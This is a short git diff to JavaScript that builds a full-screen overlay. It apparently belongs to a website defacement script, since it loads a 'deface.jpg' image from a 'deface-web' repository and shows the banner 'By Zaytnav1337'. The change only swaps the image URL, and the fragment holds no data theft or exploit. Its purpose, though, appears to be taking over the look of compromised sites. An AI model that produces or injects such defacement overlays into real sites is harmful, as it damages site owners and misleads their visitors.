@@ -14,7 +14,7 @@ overlay.style.overflowY = 'auto'; // agar bisa scroll jika konten tinggi
 overlay.innerHTML = `
   <div style="position: absolute; top: 20px; right: 30px; font-size: 24px; color: white; cursor: pointer;" id="close-btn" title="Close">✖</div>
   <div style="padding-top: 60px;">
-    <img src="https://cdn.jsdelivr.net/gh/zaytnav1337/deface-web@main/How-to-recover-a-hacked-website-and-get-your-SEO-back-on-track.jpeg" 
+    <img src="https://cdn.jsdelivr.net/gh/zaytnav1337/deface-web@main/deface.jpg" 
          style="max-width: 100%; height: 75vh; object-fit: cover;">
     <div style="margin-top: 30px;">
       <h1 style="font-size:2.8vw;">By Zaytnav1337</h1>
